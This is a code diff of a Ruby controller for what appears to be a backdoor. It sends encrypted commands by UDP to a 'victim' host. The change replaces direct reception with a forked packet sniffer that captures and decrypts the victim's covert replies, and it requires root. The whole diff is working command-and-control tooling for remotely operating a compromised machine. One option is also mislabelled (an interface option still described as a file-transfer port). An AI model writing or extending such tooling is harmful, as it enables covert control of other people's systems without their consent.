@@ -2,6 +2,7 @@
 
 # Ruby Libraries to load
 require "socket"
+require "pcaplet"
 require "./lib_trollop.rb"
 require "./dispatch.rb"
 
@@ -19,7 +20,7 @@ where [options] are:
 	
 	opt :host, "Victim IP", :short => "-H", :type => :string, :default => "127.0.0.1" # string --host <s>, default 127.0.0.1
 	opt :cport, "Victim Command Port", :short => "-c", :default => 8000 # integer --cport <i>, default 8000
-	opt :fport, "Victim File Transfer Port", :short => "f", :default => 8001 # integer --fport <i>, default 8001
+	opt :dev, "Victim File Transfer Port", :short => "d", :default => "lo" # integer --fport <i>, default 8001
 end
 
 # Make sure that we are running as root
@@ -29,7 +30,18 @@ raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 udp = UDPSocket.new
 dis = Dispatch.new
 
-udp.connect(opts[:host], opts[:cport])
+# Create child process for sniffing
+child = fork {
+    cap = Pcap::Capture.open_live(opts[:dev])
+    cap.setfilter("udp and src host " + opts[:host].to_s + " and src port " + opts[:cport].to_s)
+
+    cap.loop do |pkt|
+	    p "Response received from: " + pkt.ip_src.to_s
+	    p dis.decrypt(pkt.udp_data.to_s)
+    end
+
+    cap.close
+}
 
 while 1 do
 	print "> "
@@ -38,6 +50,7 @@ while 1 do
 	cmds = cmd.split(' ')
 	
 	if cmds[0] == "quit" or cmd[0] == "q" then # Quit terminal
+	    Process.kill('INT', child) # Kills the worker child
 		abort("Quitting...")
 	elsif cmds[0] == "help" or cmds[0] == "h" then # Show commands
 		print "\nCommands:\n\n"
@@ -77,15 +90,5 @@ while 1 do
 	else # Normal commands
 		hash = dis.encrypt(cmd)
 		udp.send(hash, 0, opts[:host], opts[:cport])
-		
-		# Wait for command to take place
-		sleep(10)
-		
-		# Receive Response
-		while response = udp.recv(1024)
-			response = dis.decrypt(response)
-			# Prince decrypted response		
-			print(response)
-		end
 	end
 end
